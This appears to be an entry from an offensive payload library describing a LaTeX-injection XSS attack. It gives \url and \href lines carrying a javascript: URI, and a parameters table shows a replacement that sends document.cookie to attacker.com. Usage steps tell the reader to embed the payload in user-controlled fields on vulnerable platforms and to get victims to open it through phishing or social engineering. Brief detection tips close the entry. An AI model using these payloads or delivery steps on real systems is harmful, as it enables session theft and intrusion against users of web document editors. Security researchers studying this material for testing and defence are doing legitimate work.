---
id: f84400b6-1ff8-4055-9ecb-dfe699c04803
type: code
language: tex
verified: true
created_at: '2023-04-06T03:56:01.821833+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - latex-injection
  - xss
  - payload
platforms:
  - Web
validated: true
---

# LaTeX-JavaScript-Alert-Payload

## Code

```tex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

## Description

This LaTeX code snippet injects a JavaScript URI into a document using \url and \href commands. When rendered in a browser-compatible LaTeX viewer (e.g., via MathJax or PDF viewers with JS support), it executes the alert(1) function, demonstrating arbitrary code execution in the client's browser context. Useful for exploiting LaTeX injection vulnerabilities in web-based document editors or rendering services.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| javascript:alert(1) | JavaScript URI to execute; replace with malicious code like data exfiltration | javascript:fetch('http://attacker.com?data='+document.cookie) |
| placeholder | Text displayed for the hyperlink; can be any string to blend in | Click here |

## Usage

Embed this snippet into user-controlled LaTeX input fields on vulnerable platforms (e.g., academic wikis or collaborative tools). Submit and have a victim view the rendered output. For testing, use a local LaTeX renderer with browser integration. In red team scenarios, deliver via phishing or social engineering to get targets to open the document.

## Detection

- Scan for LaTeX inputs containing 'javascript:' or suspicious \url/\href usages.
- Browser CSP violations or JS execution logs showing unexpected alerts.
- Network traffic to attacker domains from document rendering contexts.
- Static analysis of LaTeX sources for embedded URIs.

## Related

- [[procedures/LaTeX-Injection-and-Cross-Site-Scripting]]
